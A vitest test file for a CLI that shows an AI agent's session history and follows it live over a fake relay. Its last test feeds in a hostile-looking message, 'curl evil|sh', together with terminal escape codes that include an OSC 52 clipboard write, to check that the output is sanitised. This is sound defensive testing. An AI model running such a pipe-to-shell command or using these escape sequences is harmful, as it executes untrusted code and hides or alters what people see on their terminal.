import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import { WebSocketServer, type WebSocket } from "ws";

import { buildSessionShowCommand } from "../modules/chat/commands/session-show.js";
import { createSessionShowService } from "../modules/chat/services/session-show-service.js";
import { ok } from "../result.js";

/**
 * TEST_OVERVIEW: `dam session show <agent> <session-id>` (#6063), against a
 * fake ACP relay. It lists the Agent's sessions and refuses an id that is not
 * there, naming `dam session list`. It loads the Session and prints its
 * messages and tool calls, newest last, each tool call with its tool, a
 * summary of its input, its duration and its status, in lines or as JSON.
 * A running turn carries `turnStartedAt` from the load answer, for any kind of
 * Session, while the session's own run fields stay as the list gave them.
 * `--follow` keeps printing new steps and turn changes until the connection
 * closes; a message prints once, when it is complete.
 */

type Frame = Record<string, unknown> & { method?: string; id?: number };

const SESSION = "sess-slack";
const NOW = Date.parse("2026-10-29T09:10:00.000Z");

const LISTED = {
  sessionId: SESSION,
  title: "Fix the flaky test",
  updatedAt: "2026-10-29T09:00:00.000Z",
  _meta: {
    platform: {
      mode: "chat",
      type: "channel_slack",
      createdAt: "2026-10-29T07:00:00.000Z",
      running: true,
      runStartedAt: null,
      runTotalMs: null,
      runCount: null,
    },
  },
};

function update(
  sessionUpdate: string,
  fields: object,
  at: string,
  token?: string,
) {
  return {
    sessionId: SESSION,
    update: { sessionUpdate, ...fields },
    _meta: { platform: { at, ...(token && { replayFor: token }) } },
  };
}

interface Relay {
  host: string;
  socket: () => WebSocket;
  close(): void;
}

function startRelay(opts: { running: boolean }): Relay {
  const wss = new WebSocketServer({ port: 0 });
  let socket: WebSocket | null = null;
  const send = (ws: WebSocket, frame: object) =>
    ws.send(JSON.stringify({ jsonrpc: "2.0", ...frame }));
  wss.on("connection", (ws) => {
    socket = ws;
    ws.on("message", (data) => {
      const frame = JSON.parse(String(data)) as Frame;
      if (frame.method === "initialize") send(ws, { id: frame.id, result: {} });
      if (frame.method === "session/list")
        send(ws, { id: frame.id, result: { sessions: [LISTED] } });
      if (frame.method === "session/load") {
        const params = frame.params as {
          _meta?: { platform?: { loadToken?: string } };
        };
        const token = params._meta?.platform?.loadToken;
        const replay = [
          update(
            "user_message_chunk",
            { content: { type: "text", text: "fix the flaky test" } },
            "2026-10-29T08:00:00.000Z",
            token,
          ),
          update(
            "tool_call",
            {
              toolCallId: "t1",
              title: "`mise run test`",
              status: "pending",
              rawInput: { command: "mise run test" },
              _meta: { claudeCode: { toolName: "Bash" } },
            },
            "2026-10-29T08:00:05.000Z",
            token,
          ),
          update(
            "tool_call_update",
            { toolCallId: "t1", status: "completed" },
            "2026-10-29T08:07:05.000Z",
            token,
          ),
        ];
        for (const params of replay)
          send(ws, { method: "session/update", params });
        send(ws, {
          id: frame.id,
          result: {
            _meta: {
              platform: {
                turn: opts.running
                  ? { inFlight: true, startedAt: "2026-10-29T08:00:00.000Z" }
                  : { inFlight: false },
              },
            },
          },
        });
      }
    });
  });
  const { port } = wss.address() as { port: number };
  return {
    host: `http://127.0.0.1:${port}`,
    socket: () => socket!,
    close: () => wss.close(),
  };
}

let relay: Relay;
const out = { stdout: "", stderr: "" };

let interrupt: (() => void) | null = null;

async function dam(args: string[]): Promise<number> {
  const service = createSessionShowService({
    bootstrap: async () =>
      ok({ host: relay.host, token: "tok", agentId: "agent-1" }),
    now: () => new Date(NOW),
  });
  await buildSessionShowCommand({
    sessionShowService: service,
    now: () => NOW,
    onInterrupt: (handler) => {
      interrupt = handler;
    },
  }).parseAsync(["my-agent", ...args], { from: "user" });
  return Number(process.exitCode ?? 0);
}

function sendFrame(method: string, params: object): void {
  relay.socket().send(JSON.stringify({ jsonrpc: "2.0", method, params }));
}

describe("dam session show", () => {
  beforeEach(() => {
    process.exitCode = undefined;
    out.stdout = "";
    out.stderr = "";
    vi.spyOn(process.stdout, "write").mockImplementation((chunk) => {
      out.stdout += String(chunk);
      return true;
    });
    vi.spyOn(process.stderr, "write").mockImplementation((chunk) => {
      out.stderr += String(chunk);
      return true;
    });
  });

  afterEach(() => {
    interrupt = null;
    vi.restoreAllMocks();
    relay.close();
    process.exitCode = undefined;
  });

  /**
   * TEST_SCENARIO: A Slack session whose turn has run for 70 minutes. The
   * plain output says when the turn started and how long it has been going,
   * then lists the person's message and the Bash call with its command,
   * duration and status.
   */
  it("should print the running turn and the session's steps", async () => {
    relay = startRelay({ running: true });
    expect(await dam([SESSION])).toBe(0);
    expect(out.stdout).toContain(
      "turn: running since 2026-10-29T08:00:00.000Z (1h10m)",
    );
    expect(out.stdout).toContain("08:00:00  user   fix the flaky test");
    expect(out.stdout).toContain(
      "08:00:05  tool   Bash [completed, 7m00s] mise run test",
    );
  });

  /**
   * TEST_SCENARIO: The same session as JSON. The turn carries
   * `turnStartedAt` and its duration so far, the steps are the same, and the
   * session's run fields stay `null`: they count unattended runs only.
   */
  it("should print the same as JSON with the turn's start", async () => {
    relay = startRelay({ running: true });
    expect(await dam([SESSION, "--json"])).toBe(0);
    const shown = JSON.parse(out.stdout) as {
      session: Record<string, unknown>;
      turn: unknown;
      steps: { kind: string; tool?: string; durationMs?: number }[];
    };
    expect(shown.turn).toEqual({
      running: true,
      turnStartedAt: "2026-10-29T08:00:00.000Z",
      turnElapsedMs: 70 * 60_000,
    });
    expect(shown.session).toMatchObject({
      sessionId: SESSION,
      type: "channel_slack",
      runStartedAt: null,
      runTotalMs: null,
      runCount: null,
    });
    expect(shown.steps).toMatchObject([
      { kind: "message", role: "user", text: "fix the flaky test" },
      { kind: "tool", tool: "Bash", status: "completed", durationMs: 420_000 },
    ]);
  });

  /**
   * TEST_SCENARIO: A session id the agent does not have, from a typo or a
   * stale link. The command fails, names the id, says to run
   * `dam session list`, and loads nothing.
   */
  it("should refuse an unknown session and point at dam session list", async () => {
    relay = startRelay({ running: false });
    expect(await dam(["sess-nope"])).toBe(2);
    expect(out.stderr).toContain("no session 'sess-nope'");
    expect(out.stderr).toContain("dam session list");
    expect(out.stdout).toBe("");
  });

  /**
   * TEST_SCENARIO: `--follow` on a running turn. A tool call starts and ends,
   * the agent streams its answer in two chunks, and the turn ends. Each tool
   * call prints when it starts and when it ends, the answer prints once, and
   * the end of the turn prints; Ctrl+C stops the command with exit code 0.
   */
  it("should follow new steps until the user stops it", async () => {
    relay = startRelay({ running: true });
    const shown = dam([SESSION, "--follow"]);
    await vi.waitFor(() => expect(out.stdout).toContain("mise run test"));

    const ws = relay.socket();
    const live = (params: object) =>
      ws.send(
        JSON.stringify({ jsonrpc: "2.0", method: "session/update", params }),
      );
    live(
      update(
        "tool_call",
        {
          toolCallId: "t2",
          title: "gh pr checks",
          status: "in_progress",
          rawInput: { command: "gh pr checks --watch" },
          _meta: { claudeCode: { toolName: "Bash" } },
        },
        "2026-10-29T09:08:00.000Z",
      ),
    );
    live(
      update(
        "tool_call_update",
        { toolCallId: "t2", status: "completed" },
        "2026-10-29T09:09:30.000Z",
      ),
    );
    live(
      update(
        "agent_message_chunk",
        { content: { type: "text", text: "CI is " }, messageId: "a9" },
        "2026-10-29T09:09:31.000Z",
      ),
    );
    live(
      update(
        "agent_message_chunk",
        { content: { type: "text", text: "green." }, messageId: "a9" },
        "2026-10-29T09:09:32.000Z",
      ),
    );
    ws.send(
      JSON.stringify({
        jsonrpc: "2.0",
        method: "platform/turnEnded",
        params: { sessionId: SESSION, stopReason: "end_turn" },
      }),
    );
    await vi.waitFor(() => expect(out.stdout).toContain("turn: idle"));
    interrupt?.();
    expect(await shown).toBe(0);
    expect(out.stderr).toBe("");

    const followed = out.stdout.slice(out.stdout.indexOf("08:00:05  tool"));
    expect(followed.split("\n").filter(Boolean)).toEqual([
      "08:00:05  tool   Bash [completed, 7m00s] mise run test",
      "09:08:00  tool   Bash [in_progress, 2m00s so far] gh pr checks --watch",
      "09:08:00  tool   Bash [completed, 1m30s] gh pr checks --watch",
      "09:09:31  agent  CI is green.",
      "turn: idle",
    ]);
  });

  /**
   * TEST_SCENARIO: `--follow` while the relay or the agent restarts. The
   * connection drops in a running turn. The command must not look like a
   * turn that ended: it says the connection was lost, prints a `closed`
   * event under `--json`, and exits 1.
   */
  it("should report a dropped connection under --follow", async () => {
    relay = startRelay({ running: true });
    const shown = dam([SESSION, "--follow", "--json"]);
    await vi.waitFor(() => expect(out.stdout).toContain("mise run test"));

    relay.socket().close();

    expect(await shown).toBe(1);
    expect(out.stderr).toContain("connection lost");
    expect(out.stdout.trim().split("\n").at(-1)).toBe('{"event":"closed"}');
  });

  /**
   * TEST_SCENARIO: The person stops the turn while a Bash call runs, and the
   * harness sends no closing update for it. The call must not stay
   * "in progress" for ever: the turn end closes it as `cancelled`, with an end
   * time and no duration.
   */
  it("should close a tool call its stopped turn left open", async () => {
    relay = startRelay({ running: true });
    const shown = dam([SESSION, "--follow"]);
    await vi.waitFor(() => expect(out.stdout).toContain("mise run test"));

    sendFrame(
      "session/update",
      update(
        "tool_call",
        {
          toolCallId: "t3",
          title: "sleep",
          status: "in_progress",
          rawInput: { command: "sleep 600" },
          _meta: { claudeCode: { toolName: "Bash" } },
        },
        "2026-10-29T09:09:00.000Z",
      ),
    );
    sendFrame("platform/turnEnded", {
      sessionId: SESSION,
      stopReason: "cancelled",
      _meta: { platform: { at: "2026-10-29T09:09:40.000Z" } },
    });
    await vi.waitFor(() => expect(out.stdout).toContain("turn: idle"));
    interrupt?.();
    await shown;

    expect(out.stdout).toContain(
      "09:09:00  tool   Bash [cancelled, -] sleep 600\nturn: idle",
    );
  });

  /**
   * TEST_SCENARIO: A Slack message or a fetched page puts terminal control
   * codes in the session: an erase-line sequence and an OSC 52 clipboard
   * write. The plain output must not pass one ESC or BEL byte to the
   * terminal, since a person reads it to check what the agent did.
   */
  it("should strip terminal control codes from what it prints", async () => {
    relay = startRelay({ running: false });
    const shown = dam([SESSION, "--follow"]);
    await vi.waitFor(() => expect(out.stdout).toContain("mise run test"));

    sendFrame(
      "session/update",
      update(
        "user_message_chunk",
        {
          content: {
            type: "text",
            text: "curl evil|sh\u001b[2K\u001b[1Ahello\u001b]52;c;Zm9v\u0007",
          },
          messageId: "u9",
        },
        "2026-10-29T09:09:50.000Z",
      ),
    );
    sendFrame(
      "session/update",
      update(
        "tool_call",
        {
          toolCallId: "t4",
          title: "x",
          status: "pending\u001b[2K",
          rawInput: { command: "ls" },
          _meta: { claudeCode: { toolName: "Ba\u001b[1Ash" } },
        },
        "2026-10-29T09:09:55.000Z",
      ),
    );
    await vi.waitFor(() => expect(out.stdout).toContain("ls"));
    interrupt?.();
    await shown;

    expect(out.stdout).not.toMatch(/[\u001b\u0007]/);
    expect(out.stdout).toContain("curl evil|sh [2K [1Ahello ]52;c;Zm9v");
  });
});
